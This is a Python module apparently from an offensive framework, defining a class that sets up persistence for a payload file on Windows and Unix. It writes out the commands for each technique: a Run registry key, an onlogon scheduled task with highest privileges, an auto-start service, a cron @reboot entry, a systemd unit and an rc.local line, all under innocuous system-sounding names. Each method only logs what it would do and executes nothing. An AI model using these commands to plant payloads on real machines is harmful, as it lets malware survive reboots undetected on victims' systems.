import os
import logging
import platform
import subprocess

class Persistence:
    def __init__(self, method):
        self.method = method
        self.logger = logging.getLogger(__name__)
        self.system = platform.system().lower()

    def establish(self):
        self.logger.info(f"Attempting to establish persistence using method: {self.method}")

        if self.system == 'windows':
            return self._windows_persistence()
        elif self.system in ['linux', 'darwin']:
            return self._unix_persistence()
        else:
            self.logger.error(f"Unsupported operating system: {self.system}")
            return False

    def _windows_persistence(self):
        if self.method == 'registry':
            return self._windows_registry_persistence()
        elif self.method == 'scheduled_task':
            return self._windows_scheduled_task_persistence()
        elif self.method == 'service':
            return self._windows_service_persistence()
        else:
            self.logger.error(f"Unknown persistence method for Windows: {self.method}")
            return False

    def _windows_registry_persistence(self):
        """Add to Windows registry for persistence"""
        try:
            # This would require admin privileges in real scenario
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "SystemUpdate"
            value_data = r"C:\Windows\System32\cmd.exe /c start /b python C:\path\to\payload.py"

            # Simulate registry addition
            self.logger.info(f"Would add registry key: {key_path}\\{value_name} = {value_data}")
            return True
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {e}")
            return False

    def _windows_scheduled_task_persistence(self):
        """Create a scheduled task for persistence"""
        try:
            task_name = "SystemMaintenance"
            command = r"schtasks /create /tn {task_name} /tr C:\path\to\payload.exe /sc onlogon /rl highest"

            # Simulate scheduled task creation
            self.logger.info(f"Would create scheduled task: {command}")
            return True
        except Exception as e:
            self.logger.error(f"Scheduled task persistence failed: {e}")
            return False

    def _windows_service_persistence(self):
        """Create a Windows service for persistence"""
        try:
            service_name = "SystemService"
            command = f'sc create {service_name} binPath= C:\\path\\to\\payload.exe start= auto'

            # Simulate service creation
            self.logger.info(f"Would create service: {command}")
            return True
        except Exception as e:
            self.logger.error(f"Service persistence failed: {e}")
            return False

    def _unix_persistence(self):
        if self.method == 'cron':
            return self._unix_cron_persistence()
        elif self.method == 'systemd':
            return self._unix_systemd_persistence()
        elif self.method == 'rc_local':
            return self._unix_rc_local_persistence()
        else:
            self.logger.error(f"Unknown persistence method for Unix: {self.method}")
            return False

    def _unix_cron_persistence(self):
        """Add to crontab for persistence"""
        try:
            cron_job = "@reboot /usr/bin/python3 /path/to/payload.py\n"

            # Simulate crontab addition
            self.logger.info(f"Would add to crontab: {cron_job.strip()}")
            return True
        except Exception as e:
            self.logger.error(f"Cron persistence failed: {e}")
            return False

    def _unix_systemd_persistence(self):
        """Create a systemd service for persistence"""
        try:
            service_content = f"""
[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 /path/to/payload.py
Restart=always

[Install]
WantedBy=multi-user.target
"""

            # Simulate service file creation
            self.logger.info("Would create systemd service file with content:")
            self.logger.info(service_content)
            return True
        except Exception as e:
            self.logger.error(f"Systemd persistence failed: {e}")
            return False

    def _unix_rc_local_persistence(self):
        """Add to /etc/rc.local for persistence"""
        try:
            rc_entry = "/usr/bin/python3 /path/to/payload.py &\n"

            # Simulate rc.local addition
            self.logger.info(f"Would add to /etc/rc.local: {rc_entry.strip()}")
            return True
        except Exception as e:
            self.logger.error(f"rc.local persistence failed: {e}")
            return False